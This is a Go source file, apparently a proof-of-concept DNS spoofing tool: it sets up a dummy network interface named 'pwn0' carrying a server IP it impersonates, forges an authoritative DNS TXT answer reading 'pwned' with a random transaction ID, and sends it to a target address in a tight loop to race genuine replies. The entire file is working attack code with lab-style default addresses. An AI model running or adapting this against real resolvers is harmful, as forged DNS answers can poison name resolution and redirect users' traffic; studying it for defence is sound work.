package main

import (
	"flag"
	"log"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/vishvananda/netlink"
)

const ifaceName = "pwn0"

var (
	target   = flag.String("t", "10.64.10.3:50000", "Target IP to send packets to")
	server   = flag.String("s", "10.64.10.2:53", "Server IP to spoof packets from")
	response = flag.String("r", "pwned", "Response TXT value")
	delay    = flag.Duration("d", 200*time.Nanosecond, "Delay between packets")
)

func createDummyIface(ip string) error {
	la := netlink.NewLinkAttrs()
	la.Name = ifaceName
	iface := &netlink.Dummy{LinkAttrs: la}
	if err := netlink.LinkAdd(iface); err != nil {
		log.Fatal(err)
	}

	// Add IP address to the interface
	addr, err := netlink.ParseAddr(ip + "/32")
	if err != nil {
		return err
	}
	if err := netlink.AddrAdd(iface, addr); err != nil {
		return err
	}

	// Set interface up
	if err := netlink.LinkSetUp(iface); err != nil {
		return err
	}

	return nil
}

func teardownIface() error {
	iface, err := netlink.LinkByName(ifaceName)
	if err != nil {
		return err
	}
	return netlink.LinkDel(iface)
}

func main() {
	flag.Parse()

	targetAddr, err := net.ResolveUDPAddr("udp", *target)
	if err != nil {
		log.Fatal(err)
	}

	serverAddr, err := net.ResolveUDPAddr("udp", *server)
	if err != nil {
		log.Fatal(err)
	}

	log.Printf("Creating pwn0 interface with %s", serverAddr.IP)
	if err := createDummyIface(serverAddr.IP.String()); err != nil {
		log.Fatal(err)
	}

	u, err := net.ListenUDP("udp", serverAddr)
	if err != nil {
		log.Fatal(err)
	}

	var answer layers.DNSResourceRecord
	answer.Type = layers.DNSTypeTXT
	answer.TXTs = [][]byte{[]byte(*response)}
	answer.Class = layers.DNSClassIN

	reply := new(layers.DNS)
	reply.QR = true
	reply.ANCount = 1
	reply.OpCode = layers.DNSOpCodeNotify
	reply.AA = true
	reply.ID = uint16(rand.Intn(65535))
	reply.Answers = []layers.DNSResourceRecord{answer}
	reply.ResponseCode = layers.DNSResponseCodeNoErr
	buf := gopacket.NewSerializeBuffer()
	if err := reply.SerializeTo(buf, gopacket.SerializeOptions{}); err != nil {
		log.Fatal(err)
	}
	packetBytes := buf.Bytes()

	log.Printf("Serialized DNS response for %s %s id %d", answer.Type, answer.TXTs, reply.ID)

	// Interrupt handler for interface cleanup
	c := make(chan os.Signal)
	txCancel := make(chan struct{})
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c

		close(txCancel)
		if err := teardownIface(); err != nil {
			log.Fatal(err)
		}

		os.Exit(0)
	}()

	// Write the packets on the wire
	log.Printf("Sending DNS responses to %s with interval %s", targetAddr, *delay)
	for {
		select {
		case <-txCancel:
			break
		default:
			_, err = u.WriteTo(packetBytes, targetAddr)
			if err != nil {
				log.Fatal(err)
			}
			time.Sleep(*delay)
		}
	}
}
